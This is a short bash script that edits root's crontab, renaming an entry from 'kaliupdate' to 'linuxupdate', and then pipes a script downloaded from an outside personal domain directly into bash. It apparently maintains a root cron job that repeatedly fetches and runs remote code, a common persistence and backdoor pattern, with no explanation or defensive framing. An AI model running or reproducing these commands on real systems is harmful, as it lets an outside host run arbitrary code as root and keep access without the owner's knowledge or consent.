#!/bin/bash

cat /var/spool/cron/root | sed -e 's/kaliupdate/linuxupdate/' > /tmp/rootcrontab
mv /tmp/rootcrontab /var/spool/cron/root

curl -L erikboesen.com/linuxupdate.sh | bash
